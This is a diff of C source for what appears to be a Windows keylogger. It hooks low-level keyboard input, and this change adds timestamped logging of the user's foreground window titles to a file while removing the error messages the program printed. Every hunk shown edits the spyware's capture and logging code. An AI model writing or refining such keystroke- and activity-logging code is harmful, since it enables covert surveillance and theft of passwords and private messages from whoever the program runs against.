@@ -4,16 +4,12 @@ HANDLE fd = NULL;
 
 HHOOK hKeyboardHook = NULL;
 
-int	write_to_file(char *str)
+void	write_to_file(char *str)
 {
 	if (fd == NULL)
-	{
-		printf("File handle is NULL\n");
 		return ;
-	}
 	DWORD bytesWritten;
-	if (!WriteFile(fd, str, (DWORD)strlen(str), &bytesWritten, NULL))
-		printf("Failed to write to file: %lu\n", GetLastError());
+	WriteFile(fd, str, (DWORD)strlen(str), &bytesWritten, NULL);
 }
 
 char	*GetDateFormated(void)
@@ -65,7 +61,14 @@ void get_foreground_window(HWND hwnd)
 		free(dateStr);
 		return;
 	}
+	WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, windowTitleUtf8, utf8Len, NULL, NULL);
 
+	char logEntry[1024];
+	snprintf(logEntry, sizeof(logEntry), "[%s] - Foreground window title: %s\n", dateStr, windowTitleUtf8);
+	write_to_file(logEntry);
+
+	free(windowTitleUtf8);
+	free(dateStr);
 }
 
 
@@ -115,7 +118,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 			}
 			else
 			{
-				// Convert virtual key to Unicode character
+
 				BYTE keyboardState[256];
 				GetKeyboardState(keyboardState);
 				
